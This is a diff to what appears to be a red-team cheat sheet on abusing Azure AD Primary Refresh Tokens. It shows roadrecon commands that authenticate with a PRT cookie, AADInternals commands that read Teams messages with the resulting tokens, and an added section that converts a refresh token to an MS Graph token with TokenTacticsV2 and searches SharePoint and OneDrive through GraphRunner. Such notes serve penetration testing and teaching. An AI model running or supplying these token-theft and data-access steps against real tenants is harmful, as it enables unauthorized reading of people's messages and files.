@@ -27,7 +27,7 @@ Get Tokens:
 roadrecon auth --prt-cookie eyJrZGZfdmVyIjoyLCJjdHgiOiJTNFhMazdaaEJxdUM2Q2J2d24wWCtacFhrdGtOdGZlRyIsImFsZyI6IkhTMjU2In0.eyJ4X2NsaWVudF9wbGF0Zm9ybSI6IndpbmRvd3MiLCJ3aW5kb3dzX2FwaV92Z...
 Tokens were written to .roadtools_auth
 ```
-### Use Tokens 
+### Use Tokens: AADInternals
 Example for gathering Teams messages using AADInternals:    
 ```
 roadrecon auth --prt-init -t <tenantId>>
@@ -37,6 +37,19 @@ $teamstokens = cat .\.roadtools_auth |ConvertFrom-Json
 Get-AADIntTeamsMessages -AccessToken $teamstokens.accesstoken
 ```
 Note: The FOCI client Id has to be specified in the `-c`parameter of roadrecon auth command, in this case the Id is for the Teams client. The Ids can be found here: https://github.com/secureworks/family-of-client-ids-research?tab=readme-ov-file#which-client-applications-are-compatible-with-each-other
+
+### Use Tokens: GraphRunner
+For this we need to use tokentactics first to get an MSGraph token from the previously created tokens:   
+```powershell
+git clone https://github.com/f-bader/TokenTacticsV2
+Import-Module .\TokenTacticsV2\TokenTactics.psd1
+Invoke-RefreshToMSGraphToken -Domain "domain.tld" -RefreshToken $teamstokens.refreshToken
+``` 
+Now import to GraphRunner:
+```powershell
+Invoke-ImportTokens -AccessToken $MSGraphToken.access_token -RefreshToken $MSGraphToken.refresh_token
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm test
+```
 
 ### RoadRecon
 ```
